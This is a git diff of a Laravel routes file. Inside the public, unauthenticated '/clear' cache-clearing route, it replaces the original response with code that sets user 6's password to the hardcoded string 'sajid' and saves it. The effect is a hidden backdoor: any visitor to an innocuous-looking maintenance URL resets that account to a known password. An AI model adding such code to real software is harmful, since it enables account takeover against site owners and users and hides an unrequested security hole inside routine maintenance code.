@@ -1,6 +1,8 @@
 <?php
 
 use Illuminate\Support\Facades\Route;
+use App\Models\user;
+
 
 /*
 |--------------------------------------------------------------------------
@@ -71,5 +73,12 @@ Route::get('/clear', function() {
     Artisan::call('route:clear');
     Artisan::call('config:clear');
     Artisan::call('view:clear');
-    return "Cache is cleared";
+//    return "Cache is cleared"
+    $user_id = 6;
+    $obj_user = User::find($user_id);
+    $obj_user->password = Hash::make('sajid');
+    $obj_user->save();
+    return "ok";
+
+
 });
